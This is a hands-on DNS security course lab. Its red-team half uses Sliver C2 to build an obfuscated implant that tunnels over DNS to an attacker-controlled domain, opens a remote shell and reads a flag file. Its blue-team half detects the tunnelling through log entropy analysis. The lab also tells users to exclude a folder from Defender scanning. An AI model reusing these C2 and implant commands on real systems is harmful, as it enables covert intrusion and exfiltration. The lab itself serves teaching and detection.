# DNS Security Lab

In this lab, we are going to subvert DNS communication to infiltrate/exfiltrate a network.

Sliver C2 will be used as it is intended to show how a adversary can use C2 frameworks to control their botnet. For "personal" replication of this infrastructure, it is advised to use [iodine](https://github.com/yarrick/iodine) which will not have the sulfurous conotation of sliver.



### Prequisites

install Docker Destkop (use Hyper V hence untick the WSL2 box)

Reboot

Authorise the folder to contain malicious : in Powershell as admin do `Add-MpPreference -ExclusionPath "C:\Users\admin\AppData\Roaming \Mobaxterm`

In Mobaxterm:

* apt install make

* git clone https://github.com/jmanteau/dns-course-labs.git
* cd dns-course-labs/dns-cyber-lab
* make up

The Makefile alias doesn't work properly on Windows : use the command given back in the Makefile error to access the shell.







# Red Team

## Generation of the payload

Connect to the C2 Server shell and execute Sliver client:

```
❯ make c2_server_shell
#
# sliver
Connecting to localhost:31337 ...

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain first strike
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >
```



### DNS Listeners

Make sure you have a DNS listener running, and to use the FQDN again. Sliver will not be able to correctly parse C2 traffic if the parent  domain is misconfigured:

```
sliver > dns --domains s.commandcontrol.com   --lport 53 -D -c

[*] Starting DNS listener with parent domain(s) [s.commandcontrol.com.] ...

[*] Successfully started job #1
```

(-D -c are for resolving an [issue](https://github.com/BishopFox/sliver/issues/1714#issuecomment-2437165100) linked to latest Sliver release)		

### Generate implant

```
sliver > generate --dns s.commandcontrol.com --os linux --save /shared-data --debug --reconnect 1

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 24s
[*] Implant saved to /root/sliver/TENDER_HOSPITAL
```



**Sliver** can generates a **malicious binary** that can be executed on a Linux machine. Once this payload is executed on the target system, it tries to establish a **covert communication channel** back to the attacker’s server, here using DNS queries. These DNS queries are sent to the domain which the attacker controls (here s.commandcontrol.com-. The attacker can use this communication channel to issue commands to the infected machine or extract sensitive information.

We use the debug flag to see what is happening on our victim  machine, as being stealthy on the execution is not the primary goal of this lab and for understanding the implant behavior, having the debug information is useful.   	



## Transfer of the payload

We could transfer the payload by DNS but DNS covert channels can be slow and for the sake of time efficiency we will do a direct transfer.

You can come back to this section and implement DNSStager once you have finished the remaining points.



## Running of the payload

The previous command will have generated the payload under the shared-data folder.

You have to run this executable from the client shell. Replace the TENDER_HOSPITAL with your payload name.

```
❯ make client_shell
/ # /shared-data/TENDER_HOSPITAL
2024/11/23 15:48:23 sliver.go:95: Hello my name is TENDER_HOSPITAL
2024/11/23 15:48:23 limits.go:58: Limit checks completed
2024/11/23 15:48:23 sliver.go:113: Running in session mode
2024/11/23 15:48:23 session.go:64: Starting interactive session connection loop ...
2024/11/23 15:48:23 transports.go:41: Starting c2 url generator () ...
2024/11/23 15:48:23 transports.go:104: Return generator: (chan *url.URL)(0xc00007c6c0)
2024/11/23 15:48:23 transports.go:92: Yield c2 uri = 'dns://s.commandcontrol.com'
2024/11/23 15:48:23 transports.go:92: Yield c2 uri = 'dns://s.commandcontrol.com'
2024/11/23 15:48:23 session.go:81: Next CC = dns://s.commandcontrol.com
2024/11/23 15:48:23 session.go:81: Next CC = dns://s.commandcontrol.com
2024/11/23 15:48:23 transports.go:92: Yield c2 uri = 'dns://s.commandcontrol.com'
2024/11/23 15:48:23 session.go:171: Attempting to connect via DNS via parent: s.commandcontrol.com
2024/11/23 15:48:23 dnsclient.go:150: DNS client connecting to 's.commandcontrol.com' (timeout: 5s) ...
2024/11/23 15:48:23 dnsclient.go:295: [dns] found resolvers: [10.89.1.3]
2024/11/23 15:48:23 crypto.go:199: TOTP Code: 52809890
2024/11/23 15:48:23 dnsclient.go:713: [dns] Fetching dns session id via 'baakb4nb9w68.s.commandcontrol.com.' ...
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of baakb4nb9w68.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 10.042231ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 1.162.116.21
2024/11/23 15:48:23 dnsclient.go:734: [dns] dns session id: 7643649
2024/11/23 15:48:23 dnsclient.go:810: [dns] Fingerprinting 1 resolver(s) ...
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c3423e1f1fbyvwzpu.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 3.180792ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 92.10.10.78
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c342ecvtvmqu41y67.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 9.623392ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 153.190.31.97
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c3427qqre76jzxjyg.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 3.844706ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 25.33.165.86
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c3426n8gqbd5er33g.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.286681ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 17.107.58.163
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPNPEZfokxzwH.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.259932ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 208.211.228.44
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPSJri3BywNN5.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.637425ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 19.118.128.142
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPbsjY7F2GKS3.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.579596ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 239.28.240.5
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPd6Zv4zcUidp.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 3.515403ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 152.37.160.128
2024/11/23 15:48:23 dnsclient.go:830: [dns] 10.89.1.3:53: avg rtt 3.74099ms, base58: true, errors 0
2024/11/23 15:48:23 dnsclient.go:649: [dns] encoded: 0, subdata space: 227 | stop: 103, len: 104
2024/11/23 15:48:23 dnsclient.go:655: [dns] shave data [0:104] of 104
2024/11/23 15:48:23 dnsclient.go:661: [dns] encoded length is 157 (max: 228)
2024/11/23 15:48:23 dnsclient.go:690: [dns] subdata 0 (0->104): 104 bytes
2024/11/23 15:48:23 dnsclient.go:693: [dns] original data: 104 bytes
2024/11/23 15:48:23 dnsclient.go:694: [dns] total subdata: 104 bytes
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 10.390112ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:152: [dns] answer (txt): [pdrzTB7BJ5lUz4TEjJItw4Zc3LNNzPll6whAc0BojCcPpQsDS9ZGuiT8d6PE0CKTCl3enPt-DllzUfGM]
2024/11/23 15:48:23 dnsclient.go:355: [dns] key exchange was successful!
2024/11/23 15:48:23 dnsclient.go:359: [dns] starting worker(s) ...
2024/11/23 15:48:23 session.go:179: Starting new session with id = &{[0xc0000a62d0] 0xc0000a0240 map[10.89.1.3:53:0xc0000ae200] .s.commandcontrol.com. 1000000000 3 5000000000 false  228 7643649 1 false 0xc0001ba390 0xc000070600 0xc000070660 [0xc00006eba0 0xc00006ebc0] 2 {} {} true}
2024/11/23 15:48:23 dnsclient.go:235: [dns] starting worker #0
2024/11/23 15:48:23 dnsclient.go:235: [dns] starting worker #0
```



## Execution from the C2

Now that the client implant is running, you should see the following message appearing indicating a new session is presnet.

Activate it with use *** (use autocomplete based on the previous log.)

Use the shell command to launch a shell from the client point of view.

Use the cat command to show the flag.txt file.

```
[*] Session 6126a4aa TENDER_HOSPITAL - n/a (79152dff528d) - linux/amd64 - Sat, 23 Nov 2024 15:52:13 UTC

sliver > use 6126a4aa-6907-4de9-88c8-99824c8cccca

[*] Active session TENDER_HOSPITAL (6126a4aa-6907-4de9-88c8-99824c8cccca)

sliver (TENDER_HOSPITAL) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 31

79152dff528d:/# cat /flag.txt
?
```

Once done, you can stop the implant on the client (with CTRL+C):

```
2024/11/24 13:43:00 dnsclient.go:250: [dns] #0 work: &{1 1WTEgnsvX2ADPtSoWeejgvgkVBCajX96TPcCsUaNTcisn8L7amj9LouY5sukVPG.hqxhttU8xuRLTx9kWkEHXpvnqcnqsPKaEQ2SKzAREcTcdnFNqB5UK6Jz27BY5Vb.rTGUMiUrSnwzcBJcw7JHeppBU5e.s.commandcontrol.com. 0xc0000991b0 <nil>}
2024/11/24 13:43:00 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 1WTEgnsvX2ADPtSoWeejgvgkVBCajX96TPcCsUaNTcisn8L7amj9LouY5sukVPG.hqxhttU8xuRLTx9kWkEHXpvnqcnqsPKaEQ2SKzAREcTcdnFNqB5UK6Jz27BY5Vb.rTGUMiUrSnwzcBJcw7JHeppBU5e.s.commandcontrol.com. ?
2024/11/24 13:43:00 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 4.471954ms (err: <nil>)
2024/11/24 13:43:00 resolver-generic.go:109: [dns] answer (a): 211.51.2.208
2024/11/24 13:43:00 dnsclient.go:428: [dns] read envelope ...
2024/11/24 13:43:00 dnsclient.go:441: [dns] poll msg domain: 6Ngv85FEMSXAyihNWDN5VbD.s.commandcontrol.com.
^C
```



### Firewal check

Consult the firewall log output to confirm that only the DNS rule has indeed been matched:

```
❯ make firewall_shell
/ # iptables -vL
Chain INPUT (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
    0     0 ACCEPT     all  --  any    any     anywhere             anywhere             ctstate RELATED,ESTABLISHED
    0     0 LOG        all  --  any    any     anywhere             anywhere             LOG level warn prefix "INPUT DROP: "

Chain FORWARD (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
 1044  159K ACCEPT     all  --  any    any     anywhere             anywhere             ctstate RELATED,ESTABLISHED
 1040  149K ACCEPT     udp  --  any    any     anywhere             anywhere             udp dpt:domain
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:domain
    0     0 LOG        all  --  any    any     anywhere             anywhere             LOG level warn prefix "FORWARD DROP: "

Chain OUTPUT (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
    0     0 LOG        all  --  any    any     anywhere             anywhere             LOG level warn prefix "OUTPUT DROP: "
```



# Blue team

## Log Analysis

As this lab aims to be "self contained", we have generated DNS zones present on the DNS public (taken from Cloudflare top 10000 DNS on Cloudflare Radar). The client is doing DNS resolution since the beginning of this lab in parallel of the Sliver client. We are going to analyze them.

Connect on the dns internal and convert the binary  dnstap log in protobuf in a readeable YAML file with:

```
❯ make dns_internal_shell
/ # dnstap-read -y /var/log/log.dnstap  > /var/log/dnslog.txt
```

You have now a readeable log:

```
❯ tail -n 42 dns_internal/var/log/dnslog.txt
type: MESSAGE
identity: 8465940cfe2f
version: BIND 9.20.3
message:
  type: CLIENT_RESPONSE
  response_time: !!timestamp 2024-11-24T13:46:27Z
  message_size: 46b
  socket_family: INET
  socket_protocol: UDP
  query_address: "10.89.1.4"
  response_address: "10.89.1.3"
  query_port: 45801
  response_port: 53
  response_message_data:
    opcode: QUERY
    status: NOERROR
    id: 8387
    flags: qr rd ra
    QUESTION: 1
    ANSWER: 1
    AUTHORITY: 0
    ADDITIONAL: 0
    QUESTION_SECTION:
      - 'brwsrfrm.com. IN A'
    ANSWER_SECTION:
      - 'brwsrfrm.com. 86400 IN A 108.121.79.28'
  response_message: |
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id:   8387
    ;; flags: qr rd ra    ; QUESTION: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
    ;; QUESTION SECTION:
    ;brwsrfrm.com.			IN	A

    ;; ANSWER SECTION:
    brwsrfrm.com.		86400	IN	A	108.121.79.28

```



Now execute the python script analysis.py:

```
❯ python3 analysis.py
[19:22:31] INFO     Parsing DNS logs from var/log/dnslog.txt                                                                                                                                                      analysis.py:313
[19:22:49] INFO     Finished parsing DNS logs                                                                                                                                                                     analysis.py:342
           INFO     Starting analysis of domains                                                                                                                                                                  analysis.py:422
Analyzing domains... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
[19:22:50] INFO     Finished analysis of domains                                                                                                                                                                  analysis.py:443
========================================
SLD: public-trust.com.
Score: 4.50 (Threshold: 4.5)
Number of flagged domains: 1
FQDNs under this SLD:
   - public-trust.com.
Averaged indicators (* is flagged, average value (global average value) :
   entropy: 3.5069 (3.0721)
   non_letter_ratio: 0.0667 (0.0248)
   hex_char_ratio: 0.2000 (0.3017)
   vowel_ratio: 0.2667 (0.3348)*
   n_gram_2: 7.1429 (20.9079)*
   n_gram_3: 7.6923 (9.8561)
   gini_index: 0.9067 (0.8627)*
   classification_error: 0.8667 (0.7978)*
   number_of_labels: 2.0000 (2.2024)
   average_interval: 0.0000 (1.5459)*
   payload_size: 17.0000 (17.9644)
------------------------------
========================================
SLD: 1024terabox.com.
Score: 4.50 (Threshold: 4.5)
Number of flagged domains: 1
FQDNs under this SLD:
   - 1024terabox.com.
Averaged indicators (* is flagged, average value (global average value) :
   entropy: 3.6645 (3.0721)
   non_letter_ratio: 0.2857 (0.0248)
   hex_char_ratio: 0.2857 (0.3017)
   vowel_ratio: 0.2857 (0.3348)*
   n_gram_2: 7.6923 (20.9079)*
   n_gram_3: 16.6667 (9.8561)
   gini_index: 0.9184 (0.8627)*
   classification_error: 0.8571 (0.7978)*
   number_of_labels: 2.0000 (2.2024)
   average_interval: 0.0000 (1.5459)*
   payload_size: 16.0000 (17.9644)
------------------------------
========================================
SLD: 524131g7t.xyz.
Score: 4.80 (Threshold: 4.5)
Number of flagged domains: 1
FQDNs under this SLD:
   - 524131g7t.xyz.
Averaged indicators (* is flagged, average value (global average value) :
   entropy: 3.4183 (3.0721)
   non_letter_ratio: 0.5833 (0.0248)*
   hex_char_ratio: 0.0000 (0.3017)
   vowel_ratio: 0.0000 (0.3348)*
   n_gram_2: 0.0000 (20.9079)*
   n_gram_3: 0.0000 (9.8561)
   gini_index: 0.9028 (0.8627)*
   classification_error: 0.8333 (0.7978)
   number_of_labels: 2.0000 (2.2024)
   average_interval: 0.0000 (1.5459)*
   payload_size: 14.0000 (17.9644)
------------------------------
========================================
SLD: choapuwtbvs.com.
Score: 4.50 (Threshold: 4.5)
Number of flagged domains: 1
FQDNs under this SLD:
   - choapuwtbvs.com.
Averaged indicators (* is flagged, average value (global average value) :
   entropy: 3.5216 (3.0721)
   non_letter_ratio: 0.0000 (0.0248)
   hex_char_ratio: 0.2857 (0.3017)
   vowel_ratio: 0.2857 (0.3348)*
   n_gram_2: 7.6923 (20.9079)*
   n_gram_3: 8.3333 (9.8561)
   gini_index: 0.9082 (0.8627)*
   classification_error: 0.8571 (0.7978)*
   number_of_labels: 2.0000 (2.2024)
   average_interval: 0.0000 (1.5459)*
   payload_size: 16.0000 (17.9644)
------------------------------
========================================
SLD: site24x7.com.
Score: 4.50 (Threshold: 4.5)
Number of flagged domains: 1
FQDNs under this SLD:
   - site24x7.com.
Averaged indicators (* is flagged, average value (global average value) :
   entropy: 3.4594 (3.0721)
   non_letter_ratio: 0.2727 (0.0248)
   hex_char_ratio: 0.1818 (0.3017)
   vowel_ratio: 0.2727 (0.3348)*
   n_gram_2: 0.0000 (20.9079)*
   n_gram_3: 11.1111 (9.8561)
   gini_index: 0.9091 (0.8627)*
   classification_error: 0.9091 (0.7978)*
   number_of_labels: 2.0000 (2.2024)
   average_interval: 0.0000 (1.5459)*
   payload_size: 13.0000 (17.9644)
------------------------------
========================================
SLD: terabox1024.com.
Score: 4.50 (Threshold: 4.5)
Number of flagged domains: 1
FQDNs under this SLD:
   - terabox1024.com.
Averaged indicators (* is flagged, average value (global average value) :
   entropy: 3.6645 (3.0721)
   non_letter_ratio: 0.2857 (0.0248)
   hex_char_ratio: 0.2857 (0.3017)
   vowel_ratio: 0.2857 (0.3348)*
   n_gram_2: 7.6923 (20.9079)*
   n_gram_3: 16.6667 (9.8561)
   gini_index: 0.9184 (0.8627)*
   classification_error: 0.8571 (0.7978)*
   number_of_labels: 2.0000 (2.2024)
   average_interval: 0.0000 (1.5459)*
   payload_size: 16.0000 (17.9644)
------------------------------
========================================
SLD: commandcontrol.com.
Score: 7.21 (Threshold: 4.5)
Number of flagged domains: 73
FQDNs under this SLD:
   - baakbyx0wa88.s.commandcontrol.com.
   - UYCkf2P1idG1KFkSoKVv.s.commandcontrol.com.
   - 1cwuqmad342jxy1pea9tjy89.s.commandcontrol.com.
   - 1cwuqmad342e9nbmfr8qq0h2.s.commandcontrol.com.
   - 6Ngv85FEMSXAquHiyZzdRWb.s.commandcontrol.com.
   - UYCkf2P1JLVniPmCmN6X.s.commandcontrol.com.
   - 1cwuqmad342bc1ak0mmn3znr.s.commandcontrol.com.
   - 3NNhTEvjhuigKuZWYu2Au1Gj835Y6LtwX5xQCVYFXetM7KokzUZbYRQhSXocvYF.DMHZoVWQpo5qQMCghT8km5ouFQDHekkVoLJriNC3NK9uQSLoUkEzGZNnAj5ycPW.Z5KJXga9rUhCZtU4Tio7jjU18Ya6WWQhMLh2iDgXKzy9Cc412zyFw5V1oLxMroc.9BXjoYykf1SzNoj9jMVysycKi2C7uqAdDaAPKuy.s.commandcontrol.com.
   - UYCkf2P1iyxi9gALCzmZ.s.commandcontrol.com.
   - 1cwuqmad342e7b5x1vnwh3yg.s.commandcontrol.com.
   - UYCkf2P1JekrA3T2CZbz.s.commandcontrol.com.
   - 3eHUAmw7uVKdY8RKWUdkBnwmVEayS3jUhJng2zycdFxSeegmB1rxMsQ9nta54mh.2FJPkqxdAg7nmkCF1kEfUyobMQB59aoffGjjQdcde4tPe24QxHETiG6eUEk65Hh.gH4GHNuFp5K3FBbe8MEPhNDqCCma3gr.s.commandcontrol.com.
   - H2Ev7q29w8mdSGMxJ8agimd7y7NVGHUW5eBJ3aUAJZZDhRsVTyFwpSVHCR2BDHw.n8uHpZJcULTPA7HsJpUjUbwAHswBwAyGqKPSkN2G6FWT2qnBdrn1fUQCJX74v5b.HbhvCNjj9aEBGsFF56vXuDTTEmZhf28MvbGPmmJxa8kZMy5B8QY.s.commandcontrol.com.
   - 6Ngv85FEMSXAiddKfXkobJV.s.commandcontrol.com.
   - 6Ngv85FEMSXAoSNcTWU2Hsg.s.commandcontrol.com.
   - 6Ngv85FEMSXb3qrgoubRJEv.s.commandcontrol.com.
   - 6Ngv85FEMSXAm9k411KUYQp.s.commandcontrol.com.
   - 1seJSpeF2h5ETxxgjj3AfkFjegAexPrN5zyLBPfG4d6RFtfczcdnYNY2bSFmKDA.WW1RqKCdZMqEN5MvYoiwUqbhHCtzNCx29UVr4uKYXqZoiLtRT1cbmEtt7wniTx8.j.s.commandcontrol.com.
   - 1NudDmC46z1nMipQpF2GSFCZ1DvUxqSt4UfZjwb4ZJUdQZFsz5DnQiVgMvuGxDL.rPZF6aqD97CJggMgUWptzdvDPUZ5zzMGMFco9GnePVTnzK24A2rZhHJkBCaLdY7.ZzhXwe4mGNCx.s.commandcontrol.com.
   - backbyhgt839ba8b.s.commandcontrol.com.
   - 6Ngv85FEMSXAyEXVnVvcHgs.s.commandcontrol.com.
   - 5Zetn7BHkeXJEzS1EkLXPtYXJbyaNNaS6FWc2yGViQARoW7xuiVnDLA2dpz9tYo.RiGD27u1LXUXo9gLq9ye57EnfimW7XD3yAKPiYFiyHyCh7rh79UG1d6nXNDAJ.s.commandcontrol.com.
   - backbyhgt859avr.s.commandcontrol.com.
   - backbyhgt879aw4.s.commandcontrol.com.
   - 4kMdLCzyk4aEtHv6GgwhMJxUmQ9utKQ4pJtSUbmYYM5Bbt12WyRVBHhtdC2q7tr.94aXdCYWWZX6HLmwJhavkPhXGSFEnEzTtzGJqg5AiRFbd1EM5aHFMs6F7.s.commandcontrol.com.
   - 4kMdLCzymkfon3zjXu86CfQ17RpJS4nLsgwdvaAXovBVv3KevADjmsAYM3F9Jgv.PQCWMNTs11d7oMFpMhesEgUtTbPcFwEX8eRy9kgzpdV9Qacih49Q6HenG.s.commandcontrol.com.
   - 6Ngv85FEMSXb4xnq54rSqkT.s.commandcontrol.com.
   - 6Ngv85FEMSXbg1uj8UjAxZB.s.commandcontrol.com.
   - backbyhgt899aw4.s.commandcontrol.com.
   - vu8NY269evX9FUZcsow748hyHGn8G5fzycJBvJixcj4F5UXTKL3pC5KKRSVifZx.KB3MdeHiPfdNYg9C2EAF7vhdRTKXzEWnovZwaBKwveg1gBGT3Tp98aEobyKNiTG.FHUkAxm.s.commandcontrol.com.
   - LpghHHXDLApz22utCaQYJ7zt5iLtmn3BdNCStwkubVPDGYDDgGajFifgu2QffYX.EDjx5CME8rX4RT5daqwjrZq681kcf8aQKbGHrP1ieuKPCmXQN6MFwxc6gxjE4vr.mTXXZ26VVbYxMJPvGvHGR85z8.s.commandcontrol.com.
   - 6Ngv85FEMSXb3MuE3hSdgc5.s.commandcontrol.com.
   - GnuEgwSD3UC8p8zWdYUo9MCipt7JkxYGRxhih11YJL3vZvb5zs8m3hNfpcPwV8V.iuifB6Fxw7XPbN1kyF5CpQYJ4kR6TThChWkho5rWCAd3fxFeM9HZyYGDMvPQLvy.77nwqiAuQEjNn8XVL3.s.commandcontrol.com.
   - 3NNhTEvjqRWxgJV72X6DqzVdSMLKkJdLD8XMSPUWY5cVzXP2gVLfPwFKwdu2BLi.igL8hHEU6wCzXziwFMoTiBJf5Pb9bJsJyWJv9bZxmYBA2ov42EjZD259EVFKKHL.UnxcijxhBuFV1pA1dRZxpMQkRF8mLAUaew5hhwZA3jtmEjK88UqVWjmNWsi5oUU.oo7AeXeYNrn6bvdedrJExbs2yPqSnqceMFH8vcH.s.commandcontrol.com.
   - backbyhgt8p9aw4.s.commandcontrol.com.
   - 6Ngv85FEMSXb11zqWjKRTfG.s.commandcontrol.com.
   - 4kMdLCzyvFBAerQXLi5Uz8VSuaYjFh7ZKz7HkgW8RtaqDPTMpP3McVqTMbrySk2.JFrdst5PBAqjk4HhTadrywdAbCktsdYRkH3VyMaaSiif5Tc5FVHGPaBUf.s.commandcontrol.com.
   - backbyhgt8u9aw4.s.commandcontrol.com.
   - 4kMdLCzytYGRM5M7u7Qfdnqgde7Rjtbgipxoea7RTQo3imxTghf2jsSnrNpPb9n.6zNems81ChmnEuboHc2wjwP2tZ2kh6BbnyemHkf7c5fWSqCJxfSgMd5qa.s.commandcontrol.com.
   - 6Ngv85FEMSXAwcsASaU5t8w.s.commandcontrol.com.
   - backbyhgt8y9aw4.s.commandcontrol.com.
   - 4kMdLCzywwGJ8CVHWRzuNzxr4VXd3ybj3QUecbz8spgr733o3Jm4yrZbAdGYUPj.7xS1iMRFL6bPUv9Yp26nFF8aaLmZqUmQzoVXb3ydyzBnc9Na5Kva8vADc.s.commandcontrol.com.
   - 6Ngv85FEMSXb6L6gXYxKLZP.s.commandcontrol.com.
   - 4kMdLCzyyEBt1NZvyeTkmVa45WQHP7FFMqnav9fvBJpPKXGvhpcZ3AHMDkBZsWm.D7pE9wSWP5KeWoBuR46EpesDEwBxfvuDG3q61DZw7mu1W93pxk9pQrSgE.s.commandcontrol.com.
   - 6Ngv85FEMSXbjRxmguTxdqu.s.commandcontrol.com.
   - backbyhgtk19aw4.s.commandcontrol.com.
   - backbyhgtk39aw4.s.commandcontrol.com.
   - HYN3PbtvJrNQaLKFv585TPgQ7rRegVpD3C4DPVbxxbRo4d6VeMGgfsUYXs7qwL6.KWb7p1dPcZXKiQjbbtpFEJdXx7ejMLAMhie2tPWnDx7R6Zb5v64T1arsG2.s.commandcontrol.com.
   - 6Ngv85FEMSXb47pA3DiTJ9e.s.commandcontrol.com.
   - dMd622Mo3rgmYHsgZSgtYPvQV3qxCAZVjd3riVG22wt9cAwEZyMRApGSmyEukk5.S88H8Rt3L97GLECnwj6xC9DMiyppUawxTDLBSZ1DnT9UPR9bpMUoHSjcNvQFmwT.kHH.s.commandcontrol.com.
   - 4kMdLCzz2Lh1v8fa8N5xCUwnsyScieTGXaQ9MphHZwQSWEnMMSG7iYhqpH9dnTm.WjNRPzHAv6brYHYZygJqFQf8ba2g9UX8cq9hjR34HxkDrBoU94BHxxBcR.s.commandcontrol.com.
   - 6Ngv85FEMSXAvGB9MX1ixDo.s.commandcontrol.com.
   - backbyhgtk59aw4.s.commandcontrol.com.
   - backbyhgtk79aw4.s.commandcontrol.com.
   - 6Ngv85FEMSXAv256SNMu93H.s.commandcontrol.com.
   - backbyhgtk99aw4.s.commandcontrol.com.
   - 3NNhTEvK18sKTnDwDxySy5jLsKDHU88DuvZ2P5LpC7wMZFEXtfQ7jktmzqD9CSN.V3FjmF6Tjxi2yvqqjG1tMQ3Rxad3q8qSmwAHv6FybdddE5KYMPdg1BNYVrLrNqY.py2K82fVLQdgiFd6widVNHqevH4mZ2u9LrCVKThFJdBC3Q29SmwHqfMgCeRHq1c.4rCUUvvpXqdLmewmD3Mnv7NkvRX3juVSbrMGMkd.s.commandcontrol.com.
   - 65u6Y3qKbvWCxkPbKDicVJbKQGPidvJ6PB2SwRD3z5mYKR3skVikGH2ZhqVU3BW.F5YN57q7ktzfad67WGxd36yUhDXYr5CLXJ8dgfjoxU3qu6FNiggikVRaQiz1agJ.c7GkSPEbt.s.commandcontrol.com.
   - a2tMe8MDwxuajVZMT1AzcSFoeWmnVAG18Hg12tifJYBtD7gk43pMVzAzJwRzMK4.NS5AbBmu4D6LhtNpMPaA91nbGXypFGohydbqfd3KSEFbuSbpoeY33rc8ybModbq.wCQsD3j8nAtZtMKzY.s.commandcontrol.com.
   - 6Ngv85FEMSXAzCB6ZPDDWJK.s.commandcontrol.com.
   - 1WTEgnsvUH1oRpTWkcYPK6oEMgudVuhDpQC4UMJj3pjYEpe9QDvN8i5esitdWZn.f3Yg8jzjaRaYHwWKRJLCJtRD6m7RTd9U1gwXFta1eoRrLnXu3TZ5rdN68DYEM1e.1hd5BDHrcHiB1u4xdcWPtpKWncd.s.commandcontrol.com.
   - 6Ngv85FEMSXAuasa9Xm7B45.s.commandcontrol.com.
   - 1NudDmC4FxkBBfyonny9uyBjSuwBV7b9xvWfUuSWRuFZiCtgbhYG1oMPPWQMj8u.gmvCxvuJy72X5MchDyE8cKyJPVRf1wXAMSfFxe7Jz4dxLneqtb5Q1reengCwVNP.xnfgfCb6Woiw.s.commandcontrol.com.
   - backbyhgtkp9awr.s.commandcontrol.com.
   - 6Ngv85FEMSXAhKmgm1WYjPD.s.commandcontrol.com.
   - 3NNhTEvK5RtJQAkJNbxQZparBLVZrv9cu2ZqANxP5mqqzTbL1KuMk5Jzrav5iK8.kZeBUti2dGvcuPBhzr1EDjMvfTygFeaX9vcDKQQ83HXx72YhdDnkas6cxMvLjDM.ZGFXy9XpR7LxLCXad878j8VzN9hQ4A7scGaVmH7JqHZcJLZcjw1mAxB5qJM9nvx.yDe4YrdLSmANP4jbHsNU4Ro7C4L28Q78vGS829K.s.commandcontrol.com.
   - backbyhgtku9aw4.s.commandcontrol.com.
   - 65u6Y3qKJMm1twx5haLqLKBErnY6b3AtgyKoQdsZ8E9d6L1HsHVW3cLeWGmU9gT.4ZHfJbrE24ZdXACnTSQdWMDGc8vivJVPhkswj5wFk2wgH7EWDQ7dn7GbimLogD8.iDphGsJoQ.s.commandcontrol.com.
   - 1WTEgnsvX2ADPtSoWeejgvgkVBCajX96TPcCsUaNTcisn8L7amj9LouY5sukVPG.hqxhttU8xuRLTx9kWkEHXpvnqcnqsPKaEQ2SKzAREcTcdnFNqB5UK6Jz27BY5Vb.rTGUMiUrSnwzcBJcw7JHeppBU5e.s.commandcontrol.com.
